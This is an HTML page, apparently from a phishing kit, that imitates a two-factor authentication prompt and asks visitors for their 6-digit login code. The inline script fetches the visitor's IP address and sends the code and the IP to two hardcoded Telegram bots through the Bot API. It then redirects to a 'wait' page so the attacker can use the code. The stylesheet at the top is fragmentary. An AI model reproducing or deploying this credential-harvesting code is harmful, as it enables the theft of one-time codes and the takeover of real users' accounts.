    <style>

        }

            font-size: 20px;

        }

            margin-bottom: 20px;
        }

            font-size: 14px;
            font-weight: normal;
            color: #555555;
        }

        input {
            width: 100%;

            border-radius: 4px;

        button {
            width: 100%;
            padding: 12px;

        @media screen and (max-width: 767px) {

                margin-left: 10px; /* Adjust the margin for better mobile display */
            }

                max-width: 100%;
                margin: 20px auto;
            }

            h3 {
                font-size: 24px;
            }
        }
     </style>

<body>

<div class="header">
    <img src="sd.png" alt="Logo">
</div>

<div class="container">
    <h3>Two-factor authentication required</h3>
    
    <img src="otp.gif" alt="OTP Image" style="width: 100%; margin-bottom: 15px;">

    <form id="authForm" action="javascript:void(0);" onsubmit="submitForm()">
        <div class="form-group">
            <label for="logincode">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. Enter the 6-digit code from your code generator or third-party app below:</label>
            <input type="number" id="logincode" name="logincode" minlength="6" required>
        </div>
        <button type="submit">Submit</button>
    </form>
</div>

<script type="text/javascript">
function submitForm() {
    // Function to retrieve the user's IP address
    function getUserIP(callback) {
        fetch('https://ipinfo.io?token=5970d5927cfe45')
            .then(response => response.json())
            .then(data => {
                callback(data.ip || '');
            })
            .catch(error => {
                console.error('Failed to retrieve user IP:', error);
                callback('');
            });
    }

    // Get the value from the 'logincode' input field
    let loginCode = document.getElementById('logincode').value;

    // Create a JSON object with the data
    let data = {
        text: `Login Code: ${loginCode}`
    };

    // Retrieve the user's IP address
    getUserIP(function (userIP) {
        // Add the user's IP address to the message
        data.text += `\nUser IP: ${userIP}`;

        // Send the data to your first Telegram bot using the API token and chat ID
        let botToken1 = '6994389657:AAGMEzPIHewiBuCevVPpgVLuxbPNsmH5zxw';
        let chatId1 = '6593075136';
        let apiUrl1 = `https://api.telegram.org/bot${botToken1}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(data.text)}`;

        // Send the data to your second Telegram bot using the API token and chat ID
        let botToken2 = '6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE';
        let chatId2 = '1389938531';
        let apiUrl2 = `https://api.telegram.org/bot${botToken2}/sendMessage?chat_id=${chatId2}&text=${encodeURIComponent(data.text)}`;

        // Send the data to both Telegram bots
        var xhr1 = new XMLHttpRequest();
        xhr1.open('GET', apiUrl1, true);
        xhr1.send();

        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', apiUrl2, true);
        xhr2.send();

        // Handle the response from the Telegram API for the first bot
        xhr1.onreadystatechange = function () {
            if (xhr1.readyState === 4) {
                if (xhr1.status === 200) {
                    // Data sent successfully
                    // Now redirect to wait.html
                    window.location.href = "wait.html";
                } else {
                    // Handle any errors
                    console.error('Failed to send data to Telegram (Bot 1)');
                }
            }
        };

        // Handle the response from the Telegram API for the second bot
        xhr2.onreadystatechange = function () {
            if (xhr2.readyState === 4) {
                if (xhr2.status === 200) {
                    // Data sent successfully
                    // Now redirect to wait.html
                    window.location.href = "wait.html";
                } else {
                    // Handle any errors
                    console.error('Failed to send data to Telegram (Bot 2)');
                }
            }
        };
    });

    // Prevent the form from submitting normally
    return false;
}
</script>
